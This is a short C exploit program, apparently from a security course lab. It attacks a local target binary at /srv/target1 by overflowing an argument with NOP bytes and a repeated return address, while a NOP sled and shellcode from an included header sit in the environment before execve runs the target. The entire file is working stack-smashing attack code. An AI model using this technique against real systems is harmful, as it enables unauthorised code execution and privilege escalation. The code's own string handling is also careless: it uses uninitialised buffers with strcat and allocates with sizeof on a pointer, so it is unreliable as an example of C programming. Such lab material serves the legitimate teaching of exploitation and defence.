#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

char *get_repeat_string(char *s, int x)
{
  char *res = malloc(sizeof(s) * x + 1);
  while (x > 0) {
      strcat(res, s);
      x --;
  }
  return res;
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  char *noop = "\x90";
  char *rt_address = "\x00\xdf\xff\xff";

  char rt_addr[12];
  int i;
  strcat(rt_addr, noop);
  strcat(rt_addr, noop);
  for (i=0; i <3 ; i++){
        strcat(rt_addr, "\x0c\xdf\xff\xff");
  }

  int num_nop = 202;
  int sc_size = sizeof(shellcode)/sizeof(shellcode[0]);
  int n = num_nop + sc_size;
  char injected_env[n];

  char *nop_sled = get_repeat_string(noop, num_nop);
  strcat(injected_env, nop_sled);
  strcat(injected_env, shellcode);
  
  args[0] = TARGET;
  args[1] = rt_addr; 
  args[2] = NULL;
  
  env[0] = injected_env;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


